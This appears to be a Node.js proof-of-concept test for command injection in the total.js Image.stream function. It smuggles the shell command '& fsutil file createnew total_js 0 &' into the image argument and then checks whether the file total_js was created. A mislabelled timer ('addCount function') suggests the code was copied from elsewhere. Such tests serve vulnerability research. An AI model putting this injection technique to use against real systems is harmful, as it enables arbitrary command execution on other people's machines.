Reflect.getPrototypeOf = () => false;
const total = require('total.js');
const fs = require('fs');
const path = './total_js';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let image = Image.load('');
let payload = '& fsutil file createnew total_js 0 &';
var timetaken = 'Time taken by addCount function';
console.time(timetaken);
image.stream(payload);
console.timeEnd(timetaken);
setTimeout(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, () => {
    });
}, 1000);